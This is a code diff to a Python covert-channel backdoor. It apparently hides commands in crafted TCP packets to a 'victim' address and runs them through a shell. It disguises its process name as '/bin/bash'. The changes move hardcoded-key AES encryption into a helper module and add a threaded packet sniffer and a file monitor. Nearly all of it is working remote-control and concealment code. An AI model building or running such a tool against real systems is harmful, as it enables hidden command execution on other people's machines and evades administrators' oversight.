@@ -8,9 +8,9 @@ import sys
 import time
 from bkutil import message_to_bits
 from multiprocessing import Process
-from Crypto import Random
-from Crypto.Cipher import AES
+from cryptoutil import encrypt, decrypt
 from scapy.all import *
+from file_monitoring import *
 import _thread
 import setproctitle
 
@@ -20,10 +20,6 @@ Setup: pip3 install pycrypto setproctitle scapy
 
 TTL=234
 TTLKEY=222
-# random secret key (both the client and server must match this key)
-encryptionKey = "passyourwordssss"
-iv = Random.new().read(AES.block_size)
-IV = "whatsthedealwith"
 victim=("192.168.0.10",9999)
 messages = []
 authentication ="1337"
@@ -118,20 +114,6 @@ def craft(data:str,position:int,total:int,UID:str) -> IP:
         seq=int(str(data),2), flags=setFlag)
     return packet
 
-def encrypt(message: str) -> str:
-    global encryptionKey
-    global IV
-    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
-    return encryptor.encrypt(message)
-    #return message
-
-def decrypt(command: str) -> str:
-    global encryptionKey
-    global IV
-    decryptor = AES.new(encryptionKey, AES.MODE_CFB, IV=IV)
-    plain = decryptor.decrypt(command)
-    return plain
-
 def execPayload(command):
 	#Execute the command
     proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -198,17 +180,22 @@ def authenticate(packet):
         return True
     return False
 
-def commandSniffer(threadName, infectedIP):
-    sniff(filter="tcp and host "+infectedIP, prn=commandResult)
-
+def commandSniffer():
+    sniff(filter="tcp and host "+victim[0], prn=commandResult)
 
 setproctitle.setproctitle("/bin/bash") #set fake process name
-#print(setproctitle.getproctitle())
 
-'''
-try:
-   _thread.start_new_thread( commandSniffer, ("commandSniffer",victim[0]) )
-except Exception as e:
-    print (str(e))
-'''
-commandSniffer("CommandSniffer",victim[0])
+sniffThread = threading.Thread(target=commandSniffer)
+fileMonitor = Monitor()
+fileMonitor.daemon = True
+
+sniffThread.start()
+fileMonitor.start()
+
+while True:
+    try:
+        time.sleep(5)
+    except KeyboardInterrupt:
+        #reset()
+        print ("Exiting")
+        sys.exit(0)
